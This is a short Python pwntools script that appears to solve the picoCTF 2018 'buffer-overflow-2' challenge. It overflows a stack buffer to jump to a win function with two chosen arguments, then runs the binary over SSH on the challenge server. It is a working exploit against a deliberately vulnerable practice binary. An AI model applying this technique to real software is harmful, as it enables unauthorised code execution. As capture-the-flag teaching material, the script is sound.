#!/usr/bin/python3

from pwn import *
from getpass import getpass

vuln = ELF('vuln')
win = p32(vuln.symbols[b'win'])
padding = ('A' * 112).encode('utf-8')
arg1 = p32(0xDEADBEEF)
arg2 = p32(0xDEADC0DE)

payload = padding + win + asm('nop')*4 + arg1 + arg2

s = ssh(host='2018shell4.picoctf.com',user=input('[+] SSH username: '),password=getpass('[+] SSH password: '))
r = s.run('cd /problems/buffer-overflow-2_3_02aff35ae94896082cad513865e6c2eb; ./vuln')

r.recv()
r.sendline(payload)
r.recv()
print(r.recv().decode('utf-8'))

s.close()

